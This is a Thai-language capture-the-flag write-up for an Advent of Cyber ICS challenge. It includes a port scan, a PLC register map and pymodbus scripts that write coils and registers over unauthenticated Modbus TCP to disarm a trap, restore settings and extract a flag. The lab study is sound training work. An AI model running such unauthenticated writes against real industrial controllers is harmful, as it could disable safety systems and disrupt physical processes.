Markdown
# 🏭 ICS/Modbus - Claus for Concern (AOC Day 19)
**Category:** `ICS/OT Security`, `Modbus TCP`, `Logic Manipulation`, `Incident Response`
**Difficulty:** `Easy - Medium`
**Target IP:** `10.49.167.1` (หรือ IP ที่โจทย์กำหนด)

---

## 📜 1. The Scenario & Threat Intelligence
ระบบควบคุมคลังสินค้าและโดรนส่งของ (SCADA/PLC) ถูกแฮกเกอร์นามว่า "King Malhare" โจมตีโดยใช้เฟรมเวิร์ก `EGGSPLOIT v6.66` สิ่งที่เกิดขึ้นคือ:
1. ระบบไม่ได้พัง แต่ **"ทำงานผิดตรรกะ"** (ส่งไข่ช็อกโกแลต แทนที่จะส่งของขวัญ)
2. แฮกเกอร์ปิดระบบตรวจสอบสต็อก (Inventory Verification) และระบบเก็บ Log (Audit Logging)
3. แฮกเกอร์วาง **Logic Bomb (Trap)** เอาไว้ ป้องกันไม่ให้ Admin เข้ามาแก้ค่ากลับได้ง่ายๆ

### 📝 The Leaked Register Map (แผนผังตู้ Modbus)
กุญแจสำคัญของการแฮก ICS คือ **"Register Map"** (หรือ Memory Map) ถ้าไม่มีสิ่งนี้ เราจะต้องเดา (Fuzz) สุ่มสี่สุ่มห้า ซึ่งอาจไปกระตุ้นระบบทำลายตัวเองได้

**Holding Registers (HR - ใช้เก็บค่าตัวเลข / Read-Write):**
* `HR0` : ประเภทของที่ส่ง (`0`=Gifts, `1`=Eggs, `2`=Baskets) -> *เป้าหมายคือต้องแก้กลับเป็น 0*
* `HR1` : โซนจัดส่ง (`1-9`=ปกติ, `10`=ทิ้งลงทะเล!)
* `HR4` : ลายเซ็นแฮกเกอร์ (ค่าปัจจุบันคือ `666`)

**Coils (C - ใช้เก็บสถานะ 0/1, True/False / Read-Write):**
* `C10` : ระบบเช็คสต็อก (True=เช็ค, False=ตาบอด)
* `C11` : ⚠️ **กับดัก (Protection/Override)** (True=ทำงาน)
* `C12` : Emergency Dump (True=ทิ้งของทั้งหมด)
* `C13` : Audit Logging (True=เก็บ Log)
* `C14` : สัญญาณบอกว่ากู้ระบบสำเร็จ (Auto-set)
* `C15` : ⚠️ **สถานะนับถอยหลังระเบิด** (Auto-armed)

> 💀 **CRITICAL RULE:** ห้ามเปลี่ยนค่า `HR0` ในขณะที่ `C11` เป็น `True` เด็ดขาด ไม่งั้นระเบิด (`C15`) จะทำงานและทิ้งของลงทะเล (`HR1=10`, `C12=True`)

---

## 📡 2. Reconnaissance (การลาดตระเวน)

**1. สแกนพอร์ตหาช่องทางเข้าถึง (IT to OT):**
```bash
nmap -sV -p 22,80,502 MACHINE_IP
Port 80 (HTTP): ระบบ HMI/SCADA Dashboard เอาไว้ดู CCTV แบบ Real-time

Port 502 (Modbus TCP): พอร์ตหัวใจหลักของ PLC ที่แฮกเกอร์ใช้เจาะ (ไม่มี Authentication)

2. การใช้ Python คุยกับ PLC (Manual Triage):
แทนที่จะใช้ Tool สำเร็จรูป เราสามารถใช้ pymodbus ต่อตรงเข้าไปคุยกับตู้ PLC เพื่อดึงข้อมูลสถานะปัจจุบันออกมาดูได้:

Python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('MACHINE_IP', port=502)
client.connect()

# อ่าน HR0 ดูว่าโดนแฮกให้ส่งไข่จริงไหม
result = client.read_holding_registers(address=0, count=1, slave=1)
print(f"HR0 (Package Type): {result.registers[0]}") # Output: 1 (Eggs)

# อ่าน C11 ดูว่ากับดักทำงานอยู่ไหม
result = client.read_coils(address=11, count=1, slave=1)
print(f"C11 (Protection): {result.bits[0]}") # Output: True (Trap is SET)

client.close()
⚔️ 3. The Execution (การกู้คืนระบบและหลบหลีกกับดัก)
ในโลกของ OT Security ลำดับการทำงาน (Sequence of Operation) คือสิ่งชี้เป็นชี้ตาย การจะกู้ระบบนี้ต้องทำตามขั้นตอนอย่างเคร่งครัด:

Disarm Trap: ต้องปิด C11 ให้เป็น False ก่อน เพื่อปลดล็อกระบบป้องกัน

Restore Logic: คืนค่า HR0 ให้เป็น 0 (Christmas Gifts)

Restore Safety: เปิด C10 (Inventory Check) ให้เป็น True

Restore Auditing: เปิด C13 (Logging) ให้เป็น True

Verify: ตรวจสอบว่า C14 เด้งเป็น True (ระบบรับทราบการกู้คืน) และ C15 ไม่ถูก Trigger

💉 Python Exploit Script (restore_christmas.py)
Python
#!/usr/bin/env python3
from pymodbus.client import ModbusTcpClient
import time

PLC_IP = "MACHINE_IP"
PORT = 502
UNIT_ID = 1

client = ModbusTcpClient(PLC_IP, port=PORT)
if not client.connect():
    print("[-] Connection failed")
    exit(1)

print("[*] Initiating Safe Restoration Sequence...")

# Step 1: ปลดชนวนระเบิด (CRITICAL)
print("[*] Disarming Trap (Setting C11 to False)...")
client.write_coil(11, False, slave=UNIT_ID)
time.sleep(1) # รอให้ PLC ประมวลผลลอจิกวงจร

# Step 2: เปลี่ยนสินค้ากลับเป็นของขวัญ
print("[*] Changing Package Type (Setting HR0 to 0)...")
client.write_register(0, 0, slave=UNIT_ID)
time.sleep(1)

# Step 3: เปิดระบบความปลอดภัยและ Log กลับคืน
print("[*] Enabling Inventory Check (C10) and Logging (C13)...")
client.write_coil(10, True, slave=UNIT_ID)
client.write_coil(13, True, slave=UNIT_ID)
time.sleep(1)

# Step 4: ตรวจสอบความสำเร็จและดึง Flag
restored = client.read_coils(14, 1, slave=UNIT_ID).bits[0]
if restored:
    print("[+] SUCCESS! Christmas is saved.")
    
    # อ่าน Flag ที่ซ่อนอยู่ใน Holding Registers (Address 20-31)
    flag_result = client.read_holding_registers(address=20, count=12, slave=UNIT_ID)
    
    # แกะ ASCII ออกจาก 16-bit Registers (Big Endian)
    flag_bytes = []
    for reg in flag_result.registers:
        flag_bytes.append(reg >> 8)   # High Byte
        flag_bytes.append(reg & 0xFF) # Low Byte
        
    flag = ''.join(chr(b) for b in flag_bytes if b != 0)
    print(f"\n[🎯] FLAG: {flag}")
else:
    print("[-] Restoration failed. Trap might be triggered.")

client.close()
🧠 4. Hacker's Takeaway (สรุปเทคนิคสำหรับ CTF)
Modbus TCP Is Unauthenticated by Design: พอร์ต 502 คือประตูที่เปิดกว้างที่สุด หากเจอพอร์ตนี้ ให้พุ่งเป้าไปที่การ Read/Write Register ได้เลย ไม่ต้องเสียเวลาหา Password

Never Blind Write (ห้าม Fuzzing มั่วซั่ว): โจทย์ OT มักจะมีกับดักประเภท "Logic Bomb" (เช่น ในข้อนี้คือ C11) การใช้เครื่องมือสาด Fuzzing ใส่ Modbus อาจทำให้ระบบพังและไม่ได้ Flag ควรอ่าน (Read) เพื่อทำความเข้าใจ Context ของระบบก่อนเสมอ

The time.sleep() is your friend: ในระบบ IT การส่ง Script ยิงรัวๆ อาจจะเร็วและดี แต่ในระบบ OT ตัว PLC ต้องใช้เวลา (Scan Cycle) ในการประมวลผลวงจร Ladder Logic การใส่ time.sleep(0.5) ระหว่างคำสั่ง Write แต่ละครั้ง จะช่วยป้องกันไม่ให้ระบบรวนครับ

Data Extraction (String to Registers): สังเกตวิธีที่โจทย์เก็บ Flag (Address 20-31) มันเอาอักษร 2 ตัว (เช่น T และ H) ไปมัดรวมกันเป็นเลขฐานสิบ 16-bit 1 ตัว นี่คือมาตรฐานที่ต้องเจอในทุกโจทย์ ICS ครับ!